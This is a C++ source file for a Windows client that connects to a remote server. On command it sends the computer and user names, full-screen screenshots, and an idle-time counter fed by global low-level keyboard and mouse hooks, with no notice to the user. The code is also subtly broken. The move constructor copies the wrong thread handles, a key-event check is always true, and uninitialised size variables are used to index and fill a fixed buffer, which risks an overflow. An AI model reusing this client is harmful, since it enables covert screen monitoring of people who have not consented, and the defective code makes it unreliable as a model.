#include "Client.h"
#include <windows.h>
#include "ScreenCapture.h"

DWORD Client::thread_id_ = 0;
std::atomic<unsigned int> Client::inactive_for_{0};

Client::Client()
  : socket_(INVALID_SOCKET)
  , valid_(false) {
  for (auto &stop_event : stop_events_) {
    stop_event = CreateEvent(nullptr, TRUE, FALSE, nullptr);  
  }
  
  pump_thread_ = CreateThread(
    nullptr,
    0,
    PumpThread,
    this,
    0,
    nullptr
  );
  activity_tracker_ = CreateThread(
    nullptr,
    0,
    ActivityThread,
    this,
    0,
    &thread_id_
  );
}

Client::Client(Client &&connection) noexcept {
  socket_ = connection.socket_;
  connection.socket_ = INVALID_SOCKET;
  valid_ = connection.valid_;
  connection.valid_ = false;
  tcp_thread_ = connection.tcp_thread_;
  connection.tcp_thread_ = nullptr;
  activity_tracker_ = connection.tcp_thread_;
  connection.activity_tracker_ = nullptr;
  pump_thread_ = connection.tcp_thread_;
  connection.pump_thread_ = nullptr;
  mouse_hook_ = connection.mouse_hook_;
  connection.mouse_hook_ = nullptr;
  keyboard_hook_ = connection.keyboard_hook_;
  connection.keyboard_hook_ = nullptr;

  for (int i = 0; i < 3; ++i) {
    stop_events_[i] = connection.stop_events_[i];
    connection.stop_events_[i] = nullptr;
  }
  
  
}

Client::Status Client::Connect(const char *address, const unsigned short port) {
  socket_ = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (socket_ == INVALID_SOCKET) {
    valid_ = false;
    return Status::kSOCKET_ERR;
  }

  sockaddr_in server_addr;
  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(port);
  server_addr.sin_addr.s_addr = inet_addr(address);

  const int result = connect(
    socket_,
    reinterpret_cast<sockaddr *>(&server_addr),
    sizeof(server_addr)
  );

  if (result == SOCKET_ERROR) {
    valid_ = false;
    return Status::kCONNECT_ERR;
  }


  tcp_thread_ = CreateThread(
    nullptr,
    0,
    TcpThread,
    this,
    0,
    nullptr
  );
  valid_ = true;
  return Status::kOK;
}

void Client::WaitTcp() const { WaitForSingleObject(tcp_thread_, INFINITE); }

Client::~Client() {
  for (const auto &stop_event : stop_events_) {
    SetEvent(stop_event);
  }
  WaitForSingleObject(tcp_thread_, INFINITE);
  WaitForSingleObject(activity_tracker_, INFINITE);
  WaitForSingleObject(pump_thread_, INFINITE);
  CloseHandle(tcp_thread_);
  CloseHandle(activity_tracker_);
  CloseHandle(pump_thread_);
  for (const auto &stop_event : stop_events_) {
    CloseHandle(stop_event);
  }
  
  if (valid_) { closesocket(socket_); }
}


bool Client::Send(const char *message, const int length) const {
  const int bytes_sent = send(socket_, message, length, 0);
  if (bytes_sent == SOCKET_ERROR) { return false; }
  return true;
}

Command Client::Receive() const {
  char data;
  const int ret = recv(socket_, &data, 1, 0);
  if (ret == -1) {
    return Command::kERR;
  }
  switch (data) {
  case 1:
    return Command::kINFO;
  case 2:
    return Command::kSCREEN;
  case 3:
    return Command::kACTIVITY;
  default:
    return Command::kERR;
  }
  
}


DWORD Client::TcpThread(const LPVOID param) {
  const Client *client = static_cast<Client *>(param);
  while (WaitForSingleObject(client->stop_events_[0], 1) == WAIT_TIMEOUT) {
    Command command = client->Receive();
    if (command == Command::kERR) { break; }
    switch (command) {
    case Command::kINFO: {
      DWORD domain_size;
      DWORD user_size;
      TCHAR buf[MAX_PATH];
      if (GetComputerNameEx(ComputerNameDnsFullyQualified, buf, &domain_size) ==
        0) {
        memset(buf, 0xff, sizeof(TCHAR) * domain_size);
        GetComputerNameEx(ComputerNameDnsFullyQualified, buf, &domain_size);
      }
      buf[domain_size] = L'.';
      TCHAR *user_offset = buf + (domain_size) + 1;
      if (GetUserName(user_offset, &user_size) == 0) {
        memset(user_offset, 0xff, sizeof(TCHAR) * user_size);
        GetUserName(user_offset, &user_size);
      }

      const DWORD size = (domain_size + user_size) * sizeof(TCHAR);
      while (!client->Send(reinterpret_cast<const char *>(&size), 4)) {}
      while (!client->Send(reinterpret_cast<char *>(&buf), size)) {}
      break;
    }
    case Command::kSCREEN: {
      IStream *file = Screenshot();
      STATSTG stats;
      file->Stat(&stats, 0);
      auto size = stats.cbSize.QuadPart;
      while (!client->Send(reinterpret_cast<char *>(&size), 8)) {}
      constexpr int chunk_size = 1024;
      char *data = new char[chunk_size];
      for (ULONGLONG i = 0; i < size;) {
        ULONG read_bytes;
        file->Read(data, chunk_size, &read_bytes);
        while (!client->Send(data, read_bytes)) {}
        i += read_bytes;
      }
      break;
    }
    case Command::kACTIVITY: {
      const unsigned int size = inactive_for_.load();
      while (!client->Send(reinterpret_cast<const char *>(&size), 4)) {}
      break;
    }
    case Command::kERR: // Unreachable
    default:
      break;
    }
  }
  return 0;
}

LRESULT CALLBACK Client::KeyboardHookProc(int nCode, WPARAM wParam,
                                          LPARAM lParam) {
  if (nCode >= 0) {
    if (wParam == WM_KEYDOWN || WM_KEYUP) { inactive_for_ = 0; }
  }
  return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

LRESULT CALLBACK
Client::MouseHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
  if (nCode >= 0) { if (wParam == WM_MOUSEMOVE) { inactive_for_ = 0; } }
  return CallNextHookEx(nullptr, nCode, wParam, lParam);
}


DWORD Client::ActivityThread(const LPVOID param) {
  const auto client = static_cast<Client *>(param);

  while (WaitForSingleObject(client->stop_events_[1], 1000) == WAIT_TIMEOUT) {
    inactive_for_ += 1;
  }
  return 0;
}

DWORD Client::PumpThread(const LPVOID param) {
  const auto client = static_cast<Client *>(param);

  client->mouse_hook_ =
    SetWindowsHookEx(WH_MOUSE_LL, MouseHookProc, nullptr, 0);
  client->keyboard_hook_ = SetWindowsHookEx(
    WH_KEYBOARD_LL, KeyboardHookProc, nullptr, 0);
  MSG msg;
  const UINT_PTR timer_id = SetTimer(nullptr, NULL, 1000, nullptr);
  while (WaitForSingleObject(client->stop_events_[2], 1) == WAIT_TIMEOUT) {
    GetMessage(&msg, nullptr, 0, 0);
  }
  KillTimer(nullptr, timer_id);
  UnhookWindowsHookEx(client->mouse_hook_);
  UnhookWindowsHookEx(client->keyboard_hook_);

  return 0;
}
